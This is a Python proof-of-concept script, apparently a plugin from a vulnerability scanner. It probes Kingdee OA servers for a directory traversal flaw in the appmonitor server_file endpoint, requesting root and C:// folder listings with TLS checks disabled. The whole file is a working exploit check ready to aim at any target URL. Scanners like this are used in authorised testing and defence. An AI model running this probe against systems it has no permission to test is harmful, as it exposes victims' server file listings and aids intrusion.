import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from lib.Urldeal import umethod
from lib import *
import logging

def 金蝶OA_server_file_目录遍历(Url):
    scheme, url, port = umethod(Url)
    urldata = scheme + "://" + url + ':' + str(port) + '/'
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:50.0) Gecko/20100101 Firefox/50.0",
    }
    plani_url = urldata + 'appmonitor/protected/selector/server_file/files?folder=/&suffix='
    window_url = urldata + "appmonitor/protected/selector/server_file/files?folder=C://&suffix="
    linux_url = urldata + "appmonitor/protected/selector/server_file/files?folder=/&suffix="
    try:
        requests.packages.urllib3.disable_warnings()
        respones1 = requests.get(plani_url, headers=headers, verify=False)
        respones2 = requests.get(window_url, headers=headers, verify=False)
        respones3 = requests.get(linux_url, headers=headers, verify=False)
        if respones1.status_code == 200:
            print(Vcolors.RED + "[+] 金蝶OA server_file 目录遍历漏洞存在{}".format(plani_url) +Vcolors.ENDC)
        elif respones2.status_code == 200:
            print(Vcolors.RED + "[+] 金蝶OA server_file 目录遍历漏洞存在{}".format(window_url) +Vcolors.ENDC)
        elif respones3.status_code == 200:
            print(Vcolors.RED + "[+] 金蝶OA server_file 目录遍历漏洞存在{}".format(linux_url) +Vcolors.ENDC)
        else:
            print(Vcolors.WARNING + "[x] 金蝶OA server_file 目录遍历漏洞不存在" +Vcolors.ENDC)
    except:
        logging.error("金蝶OA_server_file_目录遍历脚本出现异常")




